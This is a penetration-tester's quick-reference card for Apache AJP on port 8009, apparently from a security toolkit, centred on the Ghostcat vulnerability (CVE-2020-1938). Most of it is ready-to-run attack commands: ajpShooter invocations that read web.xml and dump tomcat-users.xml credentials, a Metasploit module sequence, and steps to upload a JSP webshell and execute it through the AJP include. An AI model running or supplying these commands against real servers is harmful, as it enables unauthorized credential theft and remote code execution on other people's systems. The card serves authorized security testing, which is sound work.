---
service: ajp
title: Apache JServ Protocol (AJP)
ports: 8009
aliases: ajp13, tomcat-ajp
---

# AJP — quick wins

**When you see it:** 8009/tcp open on a Tomcat host → Ghostcat (CVE-2020-1938) is almost
certainly exploitable if the version is ≤ Tomcat 9.0.30 / 8.5.50 / 7.0.99. Unauthenticated
arbitrary file read from the webapp root; becomes RCE if the app allows file upload.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to or execute on
> the target — confirm scope first.

## Triage (read-only)
```sh
# Confirm AJP is open and banner the Tomcat version
nmap -sV -p 8009 H
# Grab server version from the HTTP port (usually co-located):
curl -sI http://H:8080/ | grep -i server
# Attempt read of WEB-INF/web.xml (safe, non-destructive file read):
python3 ajpShooter.py http://H 8009 /WEB-INF/web.xml read
```

## Quick wins

### Ghostcat file read (CVE-2020-1938)
```sh
# Read deployment descriptor — reveals app paths, servlets, auth configuration:
python3 ajpShooter.py http://H 8009 /WEB-INF/web.xml read
# Dump Tomcat user credentials:
python3 ajpShooter.py http://H 8009 /WEB-INF/../conf/tomcat-users.xml read
```
*Why:* the AJP connector treats the `javax.servlet.include.request_uri` attribute as a
local file path, allowing any file under the webapp root (including `WEB-INF/`) to be
read without authentication. `tomcat-users.xml` frequently contains manager credentials.

*Affected:* Tomcat 6.x, 7.x < 7.0.100, 8.x < 8.5.51, 9.x < 9.0.31.

*Tool:* `ajpShooter.py` — `pip install ajpShooter` or
`git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487`.

### Ghostcat file read — Metasploit
```sh
msfconsole -q
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS H
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run
```
*Why:* same file-read primitive via the Metasploit module; useful when ajpShooter's
Jython dependency is unavailable.

### Ghostcat JSP include RCE (if upload exists) ✏️
```sh
# 1. Upload a JSP webshell through the app's file-upload feature (e.g. profile picture,
#    attachment) — the file must land inside the webapp document root.
# 2. Trigger execution via the AJP include path:
python3 ajpShooter.py http://H 8009 /uploads/shell.jsp eval
# "eval" mode sends the included file for JSP execution rather than raw read.
```
*Why:* CVE-2020-1938 is "potential RCE" — the AJP `require_uri` attribute triggers a
server-side JSP include of any file in the webroot. If an attacker can upload a `.jsp`
(or rename a file to `.jsp`), the include executes it on the server.

## aranum helpers
- `aranumtoolkit/network/enum-ajp.sh` — produced this finding; runs nmap AJP probes and
  version detection.

## Gotchas
- AJP is typically bound to `0.0.0.0` by default on older Tomcat installs but may be
  loopback-only on newer or hardened deployments — confirm reachability before testing.
- Tomcat 9.0.31+ / 8.5.51+ / 7.0.100+ require `secret` attribute on the AJP connector —
  without the correct shared secret the connection is rejected; check `server.xml` if you
  have LFI already.
- File read is limited to the webapp directory (`appBase`); files outside it
  (e.g. `/etc/passwd`) are not reachable through Ghostcat.
- If only HTTP (8080) is open but AJP (8009) is filtered, check for nginx/httpd
  reverse-proxy configs that forward AJP internally — Ghostcat is still exploitable from
  the web port via request smuggling in some configurations.
- RCE requires the upload landing inside `appBase` — a file stored in `/tmp` or a
  separate partition won't be served by the AJP include.

## Sources
- HackTricks `8009-pentesting-apache-jserv-protocol-ajp`; Hackviser Apache Tomcat
  Pentesting; Tenable CVE-2020-1938 advisory; NVD CVE-2020-1938.
